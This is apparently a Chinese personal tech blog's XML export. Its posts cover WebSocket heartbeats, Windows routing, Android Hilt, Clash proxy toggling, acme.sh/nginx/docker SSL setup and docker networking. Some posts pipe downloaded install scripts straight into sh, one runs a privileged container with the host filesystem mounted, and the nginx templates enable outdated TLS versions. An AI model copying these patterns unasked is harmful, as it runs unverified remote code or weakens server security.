心跳心跳就是客户端定时的给服务端发送消息，证明客户端是在线的， 如果超过一定的时间没有发送则就是离线了。 已知：nginx 代理的 websocket 转发，无消息连接会出现超时断开问题两种解决办法

修应nginx配置信息
websocket发送心跳包主动触发有两种。主动断开连接ws.close();主动发送消息ws.send(“hello world”);

断线时如何解决心跳包机制：它像心跳一样每隔固定时间发一次，以此来告诉服务器，这个客户端还活着。事实上这是为了保持长连接，至于这个包的内容，是没有什么特别规定的，不过一般都是很小的包，或者只包含包头的一个空包。下一个定时器，在一定时间间隔下发送一个空包给客户端，然后客户端反馈一个同样的空包回来，服务器如果在一定时间内收不到客户端发送过来的反馈包，那就只有认定掉线了。
总结：WebSocket 是为了在 web 应用上进行双通道通信而产生的协议，相比于轮询HTTP请求的方式，WebSocket 有节省服务器资源，效率高等优点。WebSocket 中的掩码是为了防止早期版本中存在中间缓存污染攻击等问题而设置的，客户端向服务端发送数据需要掩码，服务端向客户端发送数据不需要掩码。WebSocket 中 Sec-WebSocket-Key 的生成算法是拼接服务端和客户端生成的字符串，进行SHA1哈希算法，再用base64编码。WebSocket 协议握手是依靠 HTTP 协议的，依靠于 HTTP 响应101进行协议升级转换。
]]></content>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows路由表</title>
    <url>/posts/5a2d328e/</url>
    <content><![CDATA[路由表是一个存储在 路由器 或者我们计算机中的 电子表格 或类数据库。路由表存储着指向特定 网络地址 的路径
路由表信息解析
ipconfig &#x2F;all查看网卡信息
route print查看路由表信息名词解释：网关，又称下一跳路由器。在发送IP数据包时，网关定义了针对特定的网络目的地址，数据包发送到的下一跳服务器。如果是本地计算机直接连接到的网络，网关通常是本地计算机对应的网络接口，但是此时接口必须和网关一致；如果是远程网络或默认路由，网关通常是本地计算机所连接到的网络上的某个服务器或路由器。接口，接口定义了针对特定的网络目的地址，本地计算机用于发送数据包的网络接口。网关必须位于和接口相同的子网（默认网关除外），否则造成在使用此路由项时需调用其他路由项，从而可能会导致路由死锁。跃点数，跳数用于指出路由的成本，通常情况下代表到达目标地址所需要经过的跳跃数量，一个跳数代表经过一个路由器。跳数越低，代表路由成本越低，优先级越高。0.0.0.0：缺省路由。当系统接收到一个目的地址不在路由表中的数据包时，系统会将该数据包通过192.168.1.129这个接口发送到缺省网关192.168.1.1。127.0.0.0：本地环路。当系统接收到一个发往目标网段127.0.0.0的数据包时，系统将接收发送给该网段的所有数据包。192.168.1.0：直连网段的路由记录。系统会将该数据包通过192.168.1.129这个接口发送出去。192.168.1.129：本地主机路由。当系统接收到一个目标ip地址为本地网卡ip地址的数据包时，系统会将该数据包收下。192.168.1.255：本地广播路由。当系统接收到一个发给直连网段的本地广播数据包时，系统会将该数据包从192.168.1.129这个接口以广播的形式发送出去。224.0.0.0：组播路由。当系统接收到一个组播数据包时，系统会将该数据包从192.168.99.8这个接口以组播的形式发送出去255.255.255.255：广播路由。在系统接收到一个绝对广播数据包时，系统会将该数据包通过192.168.99.8这个接口发送出去。

windows路由表操作route操作网络路由表。ROUTE [-f] [-p] [-4|-6] command [destination]                  [MASK netmask]  [gateway] [METRIC metric]  [IF interface]  -f           清除所有网关项的路由表。如果与某个               命令结合使用，在运行该命令前，               应清除路由表。  -p           与 ADD 命令结合使用时，将路由设置为               在系统引导期间保持不变。默认情况下，重新启动系统时，               不保存路由。忽略所有其他命令，               这始终会影响相应的永久路由。  -4           强制使用 IPv4。  -6           强制使用 IPv6。  command      其中之一:                 PRINT     打印路由                 ADD       添加路由                 DELETE    删除路由                 CHANGE    修改现有路由  destination  指定主机。  MASK         指定下一个参数为“netmask”值。  netmask      指定此路由项的子网掩码值。               如果未指定，其默认设置为 255.255.255.255。  gateway      指定网关。  interface    指定路由的接口号码。  METRIC       指定跃点数，例如目标的成本。用于目标的所有符号名都可以在网络数据库文件 NETWORKS 中进行查找。用于网关的符号名称都可以在主机名称数据库文件 HOSTS 中进行查找。如果命令为 PRINT 或 DELETE。目标或网关可以为通配符，(通配符指定为星号“*”)，否则可能会忽略网关参数。如果 Dest 包含一个 * 或 ?，则会将其视为 Shell 模式，并且只打印匹配目标路由。“*”匹配任意字符串，而“?”匹配任意一个字符。示例: 157.*.1、157.*、127.*、*224*。只有在 PRINT 命令中才允许模式匹配。诊断信息注释:    无效的 MASK 产生错误，即当 (DEST &amp; MASK) != DEST 时。    示例: &gt; route ADD 157.0.0.0 MASK 155.0.0.0 157.55.80.1 IF 1             路由添加失败: 指定的掩码参数无效。             (Destination &amp; Mask) != Destination。示例:    &gt; route PRINT    &gt; route PRINT -4    &gt; route PRINT -6    &gt; route PRINT 157*          .... 只打印那些匹配  157* 的项    &gt; route ADD 157.0.0.0 MASK 255.0.0.0  157.55.80.1 METRIC 3 IF 2             destination^      ^mask      ^gateway     metric^    ^                                                         Interface^      如果未给出 IF，它将尝试查找给定网关的最佳      接口。    &gt; route ADD 3ffe::/32 3ffe::1    &gt; route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2      CHANGE 只用于修改网关和/或跃点数。    &gt; route DELETE 157.0.0.0    &gt; route DELETE 3ffe::/32

双网卡配置实例详见原文
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows路由表</tag>
      </tags>
  </entry>
  <entry>
    <title>axios Promise 响应封装</title>
    <url>/posts/31409493/</url>
    <content><![CDATA[axiosaxios也是返回一个promise对象，他会封装两个结果，成功即为response，需要取出从服务器获得的响应数据，response.data。失败为error，需要获取为error.message。
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>android-hilt</title>
    <url>/posts/56bcb77a/</url>
    <content><![CDATA[hilt依赖注入他应该满足，只要应用程序存在，那么依赖项就一直存在，并且保持单例模式
添加依赖项首先，将 hilt-android-gradle-plugin 插件添加到项目的根级 build.gradle 文件中：
plugins &#123;  ...  id(&quot;com.google.dagger.hilt.android&quot;) version &quot;2.44&quot; apply false&#125;

然后，应用 Gradle 插件并在 app/build.gradle 文件中添加以下依赖项：
plugins &#123;    id(&quot;com.android.application&quot;)    id(&quot;org.jetbrains.kotlin.android&quot;)    kotlin(&quot;kapt&quot;)    id(&quot;com.google.dagger.hilt.android&quot;))dependences&#123;  //Dagger Hilt    implementation(&quot;com.google.dagger:hilt-android:2.44&quot;)    kapt(&quot;com.google.dagger:hilt-android-compiler:2.44&quot;)//ViewModel Compose    implementation(&quot;androidx.lifecycle:lifecycle-viewmodel-compose:2.6.2&quot;)&#125;// Allow references to generated codekapt &#123;  correctErrorTypes = true&#125;

注册Activity，ApplicationHilt 应用类所有使用 Hilt 的应用都必须包含一个带有 @HiltAndroidApp 注解的 Application 类。
@HiltAndroidApp 会触发 Hilt 的代码生成操作，生成的代码包括应用的一个基类，该基类充当应用级依赖项容器。(需要在Manifest中注册)
@HiltAndroidAppclass ExampleApplication : Application() &#123; ... &#125;

将依赖项注入 Android 类在 Application 类中设置了 Hilt 且有了应用级组件后，Hilt 可以为带有 @AndroidEntryPoint 注解的其他 Android 类提供依赖项：
@AndroidEntryPointclass ExampleActivity : AppCompatActivity() &#123; ... &#125;

Hilt 目前支持以下 Android 类：

Application（通过使用 @HiltAndroidApp）
ViewModel（通过使用 @HiltViewModel）
Activity
Fragment
View
Service
BroadcastReceiver

singleton component vs singleton annotation？@Module@InstallIn(SingletonComponent::class)//it means lifetime of our dependenciesobject AppModule &#123;    @Provides    @Singleton    //it means all component will use this one object    fun provideMyApi(): MyApi &#123;        return Retrofit.Builder()            .baseUrl(&quot;https://zfxt.top&quot;)            .build()            .create(MyApi::class.java)    &#125;&#125;

viewModel构建一个viewModel带参数时，我们通常需要使用到factory去构建，不然将会很难实现其功能。如下：
class MyViewModel(    private val repository: MyRepository):ViewModel() &#123;&#125; //使用注解后@HiltViewModelclass MyViewModel @Inject constructor(    private val repository: MyRepository):ViewModel() &#123;&#125; //只需要使用viewModel:MyViewModel = viewModel()

AppModule对于AppModule中相互调用，只需要添加其参数即可自动识别到

对于Module而言，他会根据返回的类型来判断注入方式。如果你对某一个类型有多个返回方法就可能导致程序奔溃，例如你定义了两个providerString1和provideString2就会导致程序奔溃

因此，我们需要通过@Named来区分同一类型的对象如何导入
如下所示
@Module@InstallIn(SingletonComponent::class)object AppModule &#123;    @Provides    @Singleton    fun provideMyApi(): MyApi &#123;        return Retrofit.Builder()            .baseUrl(&quot;https://zfxt.top&quot;)            .build()            .create(MyApi::class.java)    &#125;    @Provides    @Singleton    fun providerMyRepository(api:MyApi,app:Application,@Named(&quot;hello1&quot;) hello:String): MyRepository &#123;        return MyRepositoryImpl(api,app)    &#125;    @Provides    @Singleton    @Named(&quot;hello1&quot;)    fun providerString1()=&quot;Hello 1&quot;    @Provides    @Singleton    @Named(&quot;hello2&quot;)    fun providerString2()=&quot;Hello 2&quot;&#125;

Binding方式我们可以不适用@Provider的方式提供，而是通过构建一个抽象类和抽象函数来实现，
如下：

首先为我们的实现类注释@Inject的构造函数方法

class MyRepositoryImpl @Inject constructor(...)


然后创建一个新的抽象类

@Module@InstallIn(SingletonComponent::class)abstract class RepositoryModule &#123;    @Binds    @Singleton    abstract fun bindMyRepository(        myRepository: MyRepositoryImpl    ):MyRepository&#125;

这样子就算实现功能了，他的使用场景通常是无法通过构造函数来构建的时候,在我们使用service的时候，我们就不能通过创建的方式来导入repository。因此我们用@Inject加上Binding的方法实现注入功能
@AndroidEntryPointclass MyService:Service()&#123;@Injectliteinit var repository:MyRepositoryoverride fun onBind(po:Intent?):IBinder?return null&#125;

Lazy Injection他会延迟注入，只有在对象被使用到的时候才去注入，
他的使用方法为在类型外包一层Lazy&lt;&gt;即可：如
@HiltviewModelclass MyViewModel @Inject constructor(private val repository:Lazy&lt;MyRepository&gt;)ViewModel()&#123;]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>hilt</tag>
      </tags>
  </entry>
  <entry>
    <title>coil的使用</title>
    <url>/posts/db99acce/</url>
    <content><![CDATA[https://juejin.cn/post/7098174443700092935
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>clash快速开启和关闭代理模式</title>
    <url>/posts/9ff5edc2/</url>
    <content><![CDATA[如何快速开启和关闭代理模式这一步的前提是你已经完成了clash的部署内容上一篇文章当完成了clash的部署后，自然是需要打开代理的简单的方法就是
export https_proxy=http://127.0.0.1:7890           export http_proxy=http://127.0.0.1:7890   export all_proxy=socks5://127.0.0.1:7891

但是这只是临时使用。如果每次开关代理都这般麻烦，倒不如不用也可以直接将这个部署到/etc/profile或者/root/.bashrc中。但他是永久性的改变。于是有些情况，他并不适用。国内的网站访问时，如果打开代理会使访问速度大大降低。得不偿失。
所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。
第一种简洁方式（但是并不太符合所期望的简洁模式） 设计两个sh脚本分别为open.sh和close.sh 先在目录下建一个目录switchmkdir switch &amp;&amp; cd switch
然后编写两个文件，并把以下内容填入open.sh#!/bin/bashexport http_proxy=http://127.0.0.1:7890export https_proxy=http://127.0.0.1:7890export all_proxy=socket5://127.0.0.1:7891echo &quot;已经打开代理&quot;
close.sh#!/bin/bashunset http_proxyunset https_proxyunset all_proxyecho &quot;已经关闭代理&quot;
他们的作用分别使打开代理和关闭代理。

普及一个知识点source和bash他们都可以执行shell脚本，但是bash命令会新建一个sh窗口，然后执行sh命令，而在新命令行中即便使用了export暴露了全局变量，也只是在新命令行以及新命令行建立的子命令行中有效。当他执行完毕后，他就会销毁构建的命令行，回到你的shell连接界面。此时你刚刚export暴露的全局变量都没了。而如果使用source去执行sh命令。他不会构建一个新命令行，而是在当前的命令行下直接执行，所以你export的全局变量就算正确完成了。
Getsource命令等同于.命令bash命令也可以简化为.&#x2F;命令即
source open.sh//等价于. open.sh////./open.sh//等价于bash open.sh
然后可以将这两个命令软链接到&#x2F;usr&#x2F;bin来达到快捷启动的方法在/usr/bin下执行以下命令
ln -s /root/switch/open.sh openProxyln -s /root/switch/close.sh closeProxy
如上，便可以简单的执行启动和关闭代理的命令
root@VM-16-15-ubuntu:~/switch# . openProxy已经打开代理root@VM-16-15-ubuntu:~/switch# . closeProxy已经关闭代理
以上就是第一种方法。2. 可以在.bashrc中定义方法，在这其中的方法，也是可以直接访问的，而且他执行完后，他export的内容就会变成全局变量。只需要在.bashrc中加入以下内容即可。具体如下
# Open proxyon() &#123;    export https_proxy=http://127.0.0.1:7890    export http_proxy=http://127.0.0.1:7890    export all_proxy=socks5://127.0.0.1:7891    echo &quot;代理已经打开&quot;&#125;# Close proxyoff() &#123;    unset http_proxy    unset https_proxy    unset all_proxy    echo &quot;代理已经关闭&quot;&#125;
然后就可以通过
onoff
来启动和关闭代理了
]]></content>
      <categories>
        <category>clash</category>
      </categories>
  </entry>
  <entry>
    <title>context.getContentResolver().query()详细用法详解</title>
    <url>/posts/cddd434c/</url>
    <content><![CDATA[这里不再多写，直接引用就好了，写的挺详尽的

引用自csdn qqq3670279


]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>d2l深度学习问题汇总</title>
    <url>/posts/d734db86/</url>
    <content><![CDATA[d2l安装问题第一步就是安装问题，可能是版本太新的问题，我安装时使用pip install d2l报过错误。所以现提供一个解决方案。有说是后面的版本，你需要提前安装mxnet，然后再安装d2l。但是我没装，所以提供下述解决方案
pip install d2l==0.15.1# 在之后还会遇到一个关于ipython新版本缺少指令的问题，需降级使用pip uninstall ipythonpip install ipython==7.22.0

更多版本可以查看d2l版本列表如此，即可解决d2l包无法使用的问题
]]></content>
  </entry>
  <entry>
    <title>ddnsgo忘记密码</title>
    <url>/posts/71584c07/</url>
    <content><![CDATA[由于ddns-go密码要求带标点符号，太久没登录忘记了，研究了一下，解决办法如下：
执行如下命令：
ddns-go -resetPassword pwd.123

pwd.123为要设置的密码，执行完会生成一个.ddns_go_config.yaml文件，这里完整路径是：/root/.ddns_go_config.yaml
root@OpenWrt:~# ddns-go -resetPassword pwd.1232024/10/02 04:00:57 Config file has been saved to: /root/.ddns_go_config.yaml2024/10/02 04:00:57 The password of username  has been reset successfully! Please restart ddns-goroot@OpenWrt:~#

接着执行cat &#x2F;root&#x2F;.ddns_go_config.yaml查看文件内容
ddns-go忘记登陆密码的处理办法其中password后面的字符串就是加密后的密码字符串，将该字符串复制填写到&#x2F;etc&#x2F;ddns-go&#x2F;ddns-go-config.yaml文件的password字段保存，然后重启ddns-go服务。
service ddns-go restart
以上是openwrt直装ddns-go ipk的解决办法，docker安装也一样，只是ssh登录换成登录docker容器shell界面，其他原理是一样的。

引用自https://post.smzdm.com/p/am38630k/

]]></content>
      <tags>
        <tag>ddnsgo</tag>
      </tags>
  </entry>
  <entry>
    <title>acme快速配置证书</title>
    <url>/posts/27335b99/</url>
    <content><![CDATA[安装ACME安装很简单，一条命令:
curl https://get.acme.sh | sh -s email=my@example.com

或者
wget -O -  https://get.acme.sh | sh -s email=my@example.com

普通用户和 root 用户都可以安装使用。
修改默认 CAacme.sh 脚本默认 CA 服务器是 ZeroSSL，有时可能会导致获取证书的时候一直出现：Pending，The CA is processing your order，please just wait.只需要把 CA 服务器改成 Let&#39;s Encrypt 即可，虽然更改以后还是有概率出现 pending，但基本 2-3 次即可成功
acme.sh --set-default-ca --server letsencrypt

使用DNS校验的方式签发证书如果你没有服务器，没有公网 IP，只需要 DNS 的解析记录即可完成验证。
自动验证（DNS API）DNS 方式的真正强大之处在于可以使用域名解析商提供的 API 自动添加 TXT 记录，且在完成验证后删除对应的记录。acme.sh 目前支持超过一百家的 DNS API。以 DNSPod.cn 为例，你需要先登录到DNSPod.cn，拿到你的 DNSPod API Key 和 ID 并设置：
export DP_Id=&quot;1234&quot;export DP_Key=&quot;sADDsdasdgdsf&quot;

现在我们可以签发通配符证书了：
acme.sh --issue --dns dns_dp -d example.com -d *.example.com# DP_Id 和 DP_Key 将保存在 ~/.acme.sh/account.conf 中，并在需要时自动获取，无需手动再设置。

如果你的域名托管在支持的DNS提供商(https://github.com/acmesh-official/acme.sh/wiki/dnsapi)这些是支持的DNS提供商列表，你可以使用DNS API来签发证书，这样就不需要使用公网ip去开通服务。
获得证书后再通过下述命令部署acme.sh --install-cert -d selflove.ren \        --key-file       /home/zfxt/docker_data/nginx/ssl/selflove.key  \        --fullchain-file /home/zfxt/docker_data/nginx/ssl/selflove.cer


引用自acme.sh官网

]]></content>
  </entry>
  <entry>
    <title>docker服务器白嫖</title>
    <url>/posts/9c04f269/</url>
    <content><![CDATA[
这篇文章的主要面向人群：临时使用linux服务器来测试一些程序，项目等。

play with docker进入这个链接，然后登陆后，就会看到如下界面他会给你提供4个小时的免费使用时长，而且你可以创建多个实例。每个实例都是4h4g的docker服务器。而且这些示例你可以通过ssh远程连接，也可以直接开放端口直接开放在外网。(可是说是配置拉满的免费服务了)
创建完成后，会有一些问题需要解决，第一，他的服务器系统并不和我们常用的ubuntu，centos类似。于是要在这个服务器上跑项目，肯定会有很多环境配置不方便。所以我们使用docker来跑一个ubuntu供我们使用命令如下：
docker run -itd --privileged --init -v /:/mnt --network host ubuntu --name ubuntu# 可以避免僵尸进程和孤儿进程--privileged --initdocker exec -it ubuntu bash# 然后使用`exec`进入docker并打开一个bash终端

如此，你就可以快乐的使用ubuntu跑一些小服务玩玩了。
原视频在这里，大家可以去看一看：

    


]]></content>
      <categories>
        <category>白嫖</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker,nginx,ssl最佳实践</title>
    <url>/posts/16639286/</url>
    <content><![CDATA[
基于我对docker，nginx还有ssl证书的部署，提出了我对这些服务最高效的部署方法。仅供参考，一定会有更好的方法，只是我还有待学习

使用docker部署nginxdocker部署nginx有什么好处呢？大概就是可以把所有相关的配置文件汇集在一块，也方便在不同的服务器中迁移。这里提供部署所使用的docker代码：
# 先创建一个nginx网络docker network create nginx_container# 运行nginx并添加到该网络中docker run --name=nginx  \--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/logs:/var/log/nginx \--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/html:/etc/nginx/html \--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/ssl:/etc/nginx/ssl \--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/nginx.conf:/etc/nginx/nginx.conf \--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/conf.d:/etc/nginx/conf.d \--network=nginx_container -p 443:443 -p 80:80 --restart=always --runtime=runc --detach=true nginx nginx -g &#x27;daemon off;&#x27;

在上述命令中，最关键的内容有4点：
本地目录映射我一共映射了4个目录和一个配置文件(这些目录和配置文件需要你提前创建好，方便docker对其映射)

logs  该目录下主要保存着每次访问网站时保存的日志记录，可以用来查询相关的访问记录和debug  

html  这里就是你所使用的静态文件了。同样映射到了docker下的/etc/nginx/html这个部分的内容即默认的root根目录。可以很方便的对不同的项目进行反向代理，而且只用填相对路径

ssl  此处放你需要配置的ssl证书，后续我会说如何配置freessl实现永久的证书自动配置功能

conf.d  这个目录存放你对不同项目的不同配置文件，做到每个项目都分开存放，结构清晰。

nginx.conf  这里是使用默认的配置文件，我会提供模板：
  user www-data;worker_processes auto;pid /run/nginx.pid;include /etc/nginx/modules-enabled/*.conf;events &#123;        worker_connections 768;        # multi_accept on;&#125;http &#123;        ##        # Basic Settings        ##        sendfile on;        tcp_nopush on;        tcp_nodelay on;        keepalive_timeout 65;        types_hash_max_size 2048;        # server_tokens off;        # server_names_hash_bucket_size 64;        # server_name_in_redirect off;        include /etc/nginx/mime.types;        default_type application/octet-stream;        ##        # SSL Settings        ##        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE        ssl_prefer_server_ciphers on;        ##        # Logging Settings        ##        access_log /var/log/nginx/access.log;        error_log /var/log/nginx/error.log;        ##        # Gzip Settings        ##        gzip on;        # gzip_vary on;        # gzip_proxied any;        # gzip_comp_level 6;        # gzip_buffers 16 8k;        # gzip_http_version 1.1;        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;        ##        # Virtual Host Configs        ##        # 这里将会引用你在conf.d下的所有配置文件。所以这个nginx.conf文件你都不用编辑        include /etc/nginx/conf.d/*.conf;        include /etc/nginx/sites-enabled/*;        include /etc/nginx/conf.d/**/*.conf;        #test_3d&#125;#mail &#123;#       # See sample authentication script at:#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript##       # auth_http localhost/auth.php;#       # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;#       # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;##       server &#123;#               listen     localhost:110;#               protocol   pop3;#               proxy      on;#       &#125;##       server &#123;#               listen     localhost:143;#               protocol   imap;#               proxy      on;#       &#125;#&#125;

配置专门的nginx网络可以看到我在上面的docker命令中，有一个--network=nginx_container的选项。
使用docker network inspect nginx_container命令查看如何将其他容器添加到某个网络中？
# 一，在启动容器时就使用--network的选项就添加到某个网络中去# 二，使用下面这条命令docker network connect &#123;network_name&#125; &#123;container_name&#125;# 例如 docker network connect nginx_container alist

使用图示来展示关于这一操作的妙用：这样子，其他的服务不占用主机的外部端口，而只依靠nginx代理出去。保证了服务的安全，也减少了端口被扫，被攻击的风险。
同时，在配置文件中，也会有很方便的地方。这里展示alist.conf我们不在需要写完整的服务器ip地址，而是通过http://alist的方式自动去访问，即便服务器被重启，他分配在不同的ip。也可以实现对应的访问功能。
还有更多关于nginx网络的部分可以查看这一文章docker网络模式
设置一直重启这里就是简单的参数配置--restart=always即使服务器因为断电等原因重启，也可以在通电后重新恢复服务。
为nginx配置ssl证书配置ssl证书其实是比较简单的事。你可以从阿里云，腾讯云免费领取到时长1年的单域名证书，然后在conf配置中开启ssl校验并配置ssl证书和密钥的地址即可。
我这里主要是为了实现泛域名的永久性配置。freessl这是我最常用的ssl证书配置服务。他提供3个月时长的免费泛域名。然后通过一些配置实现到期自动更新部署新的证书，做到永久有效。

他有新版和旧版之区分，我这里演示旧版的功能。新版就是替你实现dns服务器的配置过程。都是很好的服务。(只是我懒得搞了。就用旧版演示看看就好啦)

添加域名添加域名可以使用泛域名和单域名。添加域名后，需要你证明这个域名是在你的名下，而且你对他有控制权。即在对应的dns服务商添加上他要求你添加的配置项

新版就是这里不需要你进行验证，而是把验证过程交给系统去实现，你只需要提供几个token。


通过添加CNAME验证，过一小段时间后，他就会校验成功。
将证书部署到服务器接下里使用acme.sh将证书部署到服务器。

安装acme.sh客户端 官方下载地址：
 curl https://get.acme.sh | sh -s email=my@example.com

 备用下载地址
 curl https://gitcode.net/cert/cn-acme.sh/-/raw/master/install.sh?inline=false | sh -s email=my@example.com

获取申请命令 在ACME客户端-&gt;申请证书中，获取安装命令  然后将你获取到的命令直接在服务器中运行即可，等待片刻后，证书和密钥就会保存在你用户目录下的.acme.sh/&#123;域名&#125;下  其中你需要使用的到的是fullchain.cer和selflove.ren.key

将证书安装到具体的目录下 命令如下：(以我的目录结构为示例)
 acme.sh --install-cert -d selflove.ren \        --key-file       /home/zfxt/docker_data/nginx/ssl/selflove.key  \        --fullchain-file /home/zfxt/docker_data/nginx/ssl/selflove.cer

 完成安装后，他会每天检测定时检测，若是域名还只剩下一个月时，他就会重新进行一次证书获取和安装 可以使用crontab -l查看系统的定时任务。会有一个和acme.sh相关的任务的


为nginx使用配置文件直接使用模板文件到时候再修改即可：
server &#123;        listen 443 ssl;        server_name alist.zfxt.top;        # 下面ssl开头的是HTTPS相关的设置        ssl_certificate          /etc/nginx/ssl/fullchain.cer;        ssl_certificate_key     /etc/nginx/ssl/all.key;        ssl_session_timeout     3600m;#session有效期，根据需要适当延长        ssl_session_cache       shared:SSL:10m;        # 使用的加解密方式        ssl_ciphers             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;        # 支持的协议类型        ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;        # 优先使用服务端的加解密方式        ssl_prefer_server_ciphers on;        location / &#123;          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;          proxy_set_header X-Forwarded-Proto $scheme;          proxy_set_header Host $host:$server_port;          proxy_set_header X-Real-IP $remote_addr;          proxy_set_header Range $http_range;          proxy_set_header If-Range $http_if_range;          proxy_redirect off;          proxy_pass http://alist:5244;          # the max size of file to upload          client_max_body_size 20000m;        &#125;    &#125;

在docker中的etc/nginx/ssl目录就映射我们在对应位置的ssl目录。因此只需要做到上述配置。就差不多配置好了ssl证书了。

以上，本次文章的目的基本就达成了。下面在补充一些关于nginx的使用说明。

nginx使用说明Nginx的location语法location [=|~|~*|^~] /uri/ &#123; … &#125;


&#x3D;         严格匹配。如果请求匹配这个location，那么将停止搜索并立即处理此请求
~         区分大小写匹配(可用正则表达式)
~*       不区分大小写匹配(可用正则表达式)
!~       区分大小写不匹配
!~*     不区分大小写不匹配
^~      如果把这个前缀用于一个常规字符串,那么告诉nginx 如果路径匹配那么不测试正则表达式

alias与root的区别
root    实际访问文件路径会拼接URL中的路径
alias   实际访问文件路径不会拼接URL中的路径

示例如下：
location ^~ /sta/ &#123;     alias /usr/local/nginx/html/static/;  &#125;

请求：http://test.com/sta/sta1.html实际访问：/etc/nginx/html/static/sta1.html 文件
location ^~ /tea/ &#123;     root /usr/local/nginx/html/;  &#125;

请求：http://test.com/tea/tea1.html实际访问：/etc/nginx/html/tea/tea1.html 文件
proxy_pass的使用location /api &#123;    proxy_pass  http://api_server;    proxy_set_header Host $host;    proxy_set_header  X-Real-IP        $remote_addr;    proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;    proxy_set_header  your-custome-header    &quot;myHeader&quot;;    proxy_set_header X-NginX-Proxy true;&#125;

配置反向代理时，移除前缀。比如我们的服务http://test.com/api/random, 我们想要代理到http://yiyan.com/random，即切换域名的同时，去掉api前缀。区别是proxy_pass结尾的/.无/则保留前缀，有/则删除前缀。
permanent 和 redirect关键字的区别
rewrite … permanent   永久性重定向，请求日志中的状态码为301
rewrite … redirect         临时重定向，请求日志中的状态码为302

]]></content>
      <categories>
        <category>最佳实践</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>ssl</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>docker网络模式</title>
    <url>/posts/f491796a/</url>
    <content><![CDATA[
该文章引用自csdn血煞长虹的文章，本文仅做概括性整理，辅助自己理解

首先，容器之间虽然不是物理隔离，但是它们彼此之间默认是不互联互通的，这也有助于保持每个容器的纯粹性，相互之间互不影响。其次，既然使用了容器，通常情况下，容器需要与宿主机通信，或者A容器与B容器通信而B不需要知道A的存在，或者A&#x2F;B两容器相互通信。



模式名称
简介
备注



bridge
容器拥有独属于自己的虚拟网卡和和虚拟IP等网络资源，它们分别通过docker0虚拟网卡与宿主机的eth0网卡交互，进而和外界网络交互
默认模式


host
容器没有自己的任何独立的网络资源(比如：容器的IP、网卡和端口)，完全和宿主机共享网络空间
弊端：同一个端口只能同时被一个容器服务绑定


none
光秃秃的一个容器，没有任何的网络资源，就是自娱自乐的光杆司令（很少用）
该模式关闭了容器的网络功能，仅有独自的网络空间（一个空架子），并且该模式不会给容器分配任何网络资源，包括虚拟网卡、路由、防火墙、IP、网关、端口等


container
它是bridge和host模式的合体，优先以bridge方式启动启动第一个容器，后面的所有容器启动时，均指定网络模式为container，它们均共享第一个容器的网络资源，除了网络资源，其他资源，容器彼此之间依然是相互隔离的
第一个以bridge方式启动的容器服务挂掉，后面依赖它的容器，都暂停服务


自定义
该模式也更为灵活，可以通过-d 指定自定义的网络模式的类型，可以是bridge或者overlay，其中overlay功能更为强大，可以指定多个subnet子网网段。
该模式，在容器之间可以使用别名相互通信，这一点很nice（重要）



docker0虚拟网卡科普：当docker进程启动时，会在主机上创建一个名为docker0的虚拟网桥，宿主机上以Bridge模式启动的容器会链接到这个虚拟网桥上。docker0默认地址172.17.0.0&#x2F;16。虚拟网桥的工作方式和物理交换机类似，这样宿主机上的所有容器就通过docker0连在一个二层网络中，再通过docker0和物理网卡eth0交互（我本机的物理网卡名字是ens33）

bridge桥接网络模式就是指，通过bridge桥接的方式，将容器连接到宿主机的docker0虚拟网桥上，每个容器都有自己的虚拟网卡和虚拟IP等网络资源，他们就像是连接在一个交换机上的设备一样，可以相互通信。
host主机网络模式容器直接使用宿主机的网络资源，不会分配自己的IP地址，端口等，完全和宿主机共享网络空间，这样容器就可以直接使用宿主机的网络资源，比如宿主机的IP地址，端口等。（缺点是：同一个端口只能同时被一个容器服务绑定）

container容器网络模式该模式≈bridge+host的混合模式，指定一个容器以bridge方式启动，后面容器启动时指定网络模式为container，它们自动共享第一个容器的网络资源。就是将第一个容器以bridge模式启动，然后其他的容器以container模式启动，这样他们就共享第一个容器的网络资源，但是其他资源还是独立的。
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>gradle&amp;amp;java&amp;amp;kotlin版本冲突问题</title>
    <url>/posts/60514e93/</url>
    <content><![CDATA[java&amp;kotlin version在使用android时，通常会遇到因为jvm版本不匹配导致的报错问题，因此现在说明一下关于这些内容。
通常我们可以看到以下内容
compileOptions &#123;        sourceCompatibility = JavaVersion.VERSION_1_8        targetCompatibility = JavaVersion.VERSION_1_8    &#125;    kotlinOptions &#123;        jvmTarget = &quot;1.8&quot;    &#125;

java version and java bite code version通常我们写出来的代码，即直接java代码这些被称为·java version，and另一个版本就是这些代码被转化为字节码即java bitecode version。通常java版本越高，我们可以使用到的语言功能越多。而java bitecode version通常发展的比java版本慢很多，他与我们可以使用到语言特点，功能没有直接的关系。
